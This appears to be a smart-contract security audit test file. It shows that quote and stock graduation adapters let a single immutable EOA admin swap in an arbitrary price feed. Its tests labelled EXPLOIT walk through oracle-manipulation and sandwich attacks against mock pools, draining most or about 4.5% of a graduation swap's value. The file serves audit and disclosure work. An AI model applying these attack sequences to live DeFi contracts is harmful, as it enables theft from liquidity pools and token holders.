/**
 * Audit 5 (privileged roles / cross-contract trust): the quote graduation adapters' `admin`.
 *
 * BnbQuoteGraduationAdapter and RobinhoodStockGraduationAdapterV2 set `admin = msg.sender` (the deployer
 * EOA), immutable, no transfer. `configureQuoteRoute` / `configureStockRoute` accept ANY contract as the
 * quote/stock price feed. The only price protection on the graduation swap (78% of every quote coin's
 * raise) is derived from that feed, and campaign.graduate() is permissionless, so whoever holds the admin
 * key can make every pending quote coin graduate through a sandwich.
 *
 *   npx hardhat test test/audit5-quote-adapter-admin.spec.ts
 */
import { expect } from "chai";
import { ethers } from "hardhat";

const WAD = 10n ** 18n;

describe("audit5: quote adapter admin (EOA) controls the graduation swap bound", function () {
  const TIGHT = {
    minimumRouteLiquidityUsdWad: 50_000n * WAD,
    maxSwapSlippageBps: 300,
    maxOracleDeviationBps: 100,
    maxPriceImpactBps: 100,
    maxGraduationPriceDeviationBps: 500,
    enabled: true,
  };

  async function bnbFixture(policy = TIGHT) {
    const [deployer, attacker] = await ethers.getSigners();
    const topazFactory = await (await ethers.getContractFactory("MockTopazFactory")).deploy();
    const wbnb = await (await ethers.getContractFactory("MockWBNB")).deploy();
    const router = await (await ethers.getContractFactory("MockBnbQuoteTopazRouter")).deploy(await topazFactory.getAddress(), await wbnb.getAddress());
    const nativeFeed = await (await ethers.getContractFactory("MockUsdPriceFeed")).deploy(8);
    const quoteFeed = await (await ethers.getContractFactory("MockUsdPriceFeed")).deploy(8);
    const now = BigInt((await ethers.provider.getBlock("latest"))!.timestamp);
    await nativeFeed.setRoundData(1, 800n * 10n ** 8n, now, now, 1);
    await quoteFeed.setRoundData(1, 1n * 10n ** 8n, now, now, 1);
    const quote = await (await ethers.getContractFactory("MockERC20")).deploy("USDT", "USDT", 10n ** 30n, deployer.address);
    await topazFactory.createPool(await wbnb.getAddress(), await quote.getAddress(), false);
    const acq = await topazFactory.getPool(await wbnb.getAddress(), await quote.getAddress(), false);
    // Honest pool: 125 WBNB / 100,000 USDT = 800 USDT per BNB, matching the $800 feed.
    await wbnb.deposit({ value: 125n * WAD });
    await wbnb.transfer(acq, 125n * WAD);
    await quote.transfer(acq, 100_000n * WAD);
    const acqPool = await ethers.getContractAt("MockTopazPool", acq);
    await acqPool.sync();
    await quote.transfer(await router.getAddress(), 10_000n * WAD);

    const locker = await (await ethers.getContractFactory("PermanentLpLocker")).deploy(deployer.address);
    await locker.configureRevenue(deployer.address, await topazFactory.getAddress());
    const factory = await (await ethers.getContractFactory("MockEvmGenRhFactory")).deploy(await locker.getAddress());
    const adapter = await (await ethers.getContractFactory("BnbQuoteGraduationAdapter")).deploy(
      await router.getAddress(),
      await locker.getAddress(),
      await nativeFeed.getAddress(),
      3600,
    );
    await adapter.setCampaignFactoryOnce(await factory.getAddress());
    await adapter.configureQuoteRoute(await quote.getAddress(), { oracleFeed: await quoteFeed.getAddress(), acquisitionPool: acq, ...policy });
    const campaign = await (await ethers.getContractFactory("MockEvmGenRhCampaign")).deploy();
    await campaign.init(ethers.id("audit5-quote"), 10n ** 27n);
    await factory.setCampaign(await campaign.getAddress(), true);
    await ethers.provider.send("hardhat_setBalance", [await campaign.getAddress(), "0x56BC75E2D63100000"]);
    const N = WAD / 10n; // 0.1 BNB pool native
    const P = 10n ** 11n; // curve price, wei per whole MEME
    const Mt = (N * WAD) / P;
    return { deployer, attacker, topazFactory, wbnb, router, nativeFeed, quoteFeed, quote, acq, acqPool, locker, factory, adapter, campaign, N, P, Mt };
  }

  async function poolQuote(f: Awaited<ReturnType<typeof bnbFixture>>) {
    const res = await f.campaign.lastResult();
    return f.quote.balanceOf(res.pool);
  }

  it("HOLDS: the adapter admin is the deploying EOA, immutable, with no transfer function", async () => {
    const f = await bnbFixture();
    expect(await f.adapter.admin()).to.eq(f.deployer.address);
    expect((await ethers.provider.getCode(f.deployer.address)).length).to.eq(2); // an EOA
    const names = f.adapter.interface.fragments.filter((x: any) => x.type === "function").map((x: any) => x.name);
    for (const n of ["transferAdmin", "setAdmin", "transferOwnership", "renounceOwnership"]) expect(names).to.not.include(n);
  });

  it("baseline: an honest route graduates at the fair rate (~79.7 USDT for 0.1 BNB)", async () => {
    const f = await bnbFixture();
    await f.campaign.graduate(await f.adapter.getAddress(), await f.quote.getAddress(), f.Mt, 2n * f.Mt, f.P, f.N);
    const q = await poolQuote(f);
    expect(q).to.be.gt(79n * WAD);
    expect(q).to.be.lt(80n * WAD);
  });

  it("HOLDS: with the honest feed, a front-run that moves the acquisition pool 100x is refused (OracleDeviationTooHigh)", async () => {
    const f = await bnbFixture();
    // front-run: attacker buys USDT with WBNB, k preserved: 1250 WBNB / 10,000 USDT (8 USDT per BNB)
    const wbnbIs0 = (await f.acqPool.token0()) === (await f.wbnb.getAddress());
    await f.acqPool.setReserves(wbnbIs0 ? 1250n * WAD : 10_000n * WAD, wbnbIs0 ? 10_000n * WAD : 1250n * WAD);
    await expect(
      f.campaign.graduate(await f.adapter.getAddress(), await f.quote.getAddress(), f.Mt, 2n * f.Mt, f.P, f.N),
    ).to.be.revertedWithCustomError(f.adapter, "OracleDeviationTooHigh");
  });

  it("EXPLOIT: the admin EOA swaps in its own 'USDT/USD' feed ($100) and the same 100x sandwich graduates; the coin's pool gets ~1% of the fair quote", async () => {
    const f = await bnbFixture();
    // 1. admin (a single EOA key) re-points the route at a feed it controls. Every other bound stays tight.
    const fake = await (await ethers.getContractFactory("MockUsdPriceFeed")).connect(f.attacker).deploy(8);
    const now = BigInt((await ethers.provider.getBlock("latest"))!.timestamp);
    await fake.connect(f.attacker).setRoundData(1, 100n * 10n ** 8n, now, now, 1);
    await f.adapter.connect(f.deployer).configureQuoteRoute(await f.quote.getAddress(), { oracleFeed: await fake.getAddress(), acquisitionPool: f.acq, ...TIGHT });
    // 2. front-run (same as the refused case above)
    const wbnbIs0 = (await f.acqPool.token0()) === (await f.wbnb.getAddress());
    await f.acqPool.setReserves(wbnbIs0 ? 1250n * WAD : 10_000n * WAD, wbnbIs0 ? 10_000n * WAD : 1250n * WAD);
    // 3. permissionless graduate() lands between the attacker's two swaps
    await f.campaign.graduate(await f.adapter.getAddress(), await f.quote.getAddress(), f.Mt, 2n * f.Mt, f.P, f.N);
    const q = await poolQuote(f);
    console.log(`      pool received ${ethers.formatEther(q)} USDT for 0.1 BNB (fair ~79.7)`);
    expect(q).to.be.lt(1n * WAD); // < 1.3% of fair; the other ~98.7% is the back-run's profit
    expect(q).to.be.gt(0n);
  });

  it("EXPLOIT (honest admin, shipped policy 500 bps): anyone can sandwich a quote graduation for ~4.5% of the pool value", async () => {
    const SHIPPED = { ...TIGHT, maxOracleDeviationBps: 500, maxPriceImpactBps: 500, maxGraduationPriceDeviationBps: 500 }; // scripts/scan-bnb-quote-routes.mjs
    const f = await bnbFixture(SHIPPED);
    // front-run to 764 USDT/BNB (k preserved): 127.9 WBNB / 97,717 USDT
    const rw = 127_900n * WAD / 1000n;
    const ru = 97_717n * WAD;
    const wbnbIs0 = (await f.acqPool.token0()) === (await f.wbnb.getAddress());
    await f.acqPool.setReserves(wbnbIs0 ? rw : ru, wbnbIs0 ? ru : rw);
    await f.campaign.graduate(await f.adapter.getAddress(), await f.quote.getAddress(), f.Mt, 2n * f.Mt, f.P, f.N);
    const q = await poolQuote(f);
    console.log(`      pool received ${ethers.formatEther(q)} USDT (fair ~79.7): ${(Number(79_700n * WAD - q * 1000n) / Number(79_700n * WAD) * 100).toFixed(2)}% extracted`);
    expect(q).to.be.lt(76_200n * WAD / 1000n); // >= 4.4% below fair, all bounds passed
  });

  it("EXPLOIT (Robinhood stock adapter, same shape): the admin EOA can set an arbitrary stock feed; a 100x feed divides the oracle minimum on the acquisition by 100", async () => {
    const [admin, attacker] = await ethers.getSigners();
    const v3 = await (await ethers.getContractFactory("MockUniswapV3Factory")).deploy();
    const weth = await (await ethers.getContractFactory("MockWETH9")).deploy();
    const npm = await (await ethers.getContractFactory("MockUniswapV3PositionManager")).deploy(await v3.getAddress(), await weth.getAddress());
    const router = await (await ethers.getContractFactory("MockUniswapV3SwapRouter")).deploy(await v3.getAddress(), await weth.getAddress());
    const ethUsd = await (await ethers.getContractFactory("MockUsdPriceFeed")).deploy(8);
    const stockUsd = await (await ethers.getContractFactory("MockUsdPriceFeed")).deploy(8);
    const now = BigInt((await ethers.provider.getBlock("latest"))!.timestamp);
    await ethUsd.setRoundData(1, 2_694_00000000n, now, now, 1);
    await stockUsd.setRoundData(1, 766_00000000n, now, now, 1);
    const stock = await (await ethers.getContractFactory("MockERC20")).deploy("SPY", "SPY", 10n ** 24n, admin.address);
    await v3.createPool(await weth.getAddress(), await stock.getAddress(), 500);
    const acq = await v3.getPool(await weth.getAddress(), await stock.getAddress(), 500);
    await stock.transfer(acq, 1_000n * WAD); // depth for the route check
    const adapter = await (await ethers.getContractFactory("RobinhoodStockGraduationAdapterV2")).deploy(
      await v3.getAddress(), await npm.getAddress(), await router.getAddress(), await weth.getAddress(), await ethUsd.getAddress(), 90_000,
    );
    expect(await adapter.admin()).to.eq(admin.address);
    const route = { oracleFeed: await stockUsd.getAddress(), acquisitionPool: acq, acquisitionFeeTier: 500, minimumRouteLiquidityUsdWad: 50_000n * WAD, maxSwapSlippageBps: 300, maxOracleDeviationBps: 0, maxPriceImpactBps: 0, enabled: true };
    await adapter.configureStockRoute(await stock.getAddress(), route);
    const [, honestMin] = await adapter.oracleMinimumStockOut(await stock.getAddress(), WAD);

    const fake = await (await ethers.getContractFactory("MockUsdPriceFeed")).connect(attacker).deploy(8);
    await fake.connect(attacker).setRoundData(1, 76_600_00000000n, now, now, 1); // 100x the real price
    await adapter.connect(admin).configureStockRoute(await stock.getAddress(), { ...route, oracleFeed: await fake.getAddress() });
    const [, rigged] = await adapter.oracleMinimumStockOut(await stock.getAddress(), WAD);
    expect(rigged * 100n).to.be.closeTo(honestMin, 10n ** 6n);
    expect(rigged).to.be.lt(honestMin / 99n);
    // The continuity band multiplies the pool's STOCK/MEME price by the same rigged feed, so a pool seeded
    // with 1/100 of the stock still reads as "at the curve price" (RobinhoodStockGraduationAdapterV2._checkContinuity).
  });
});
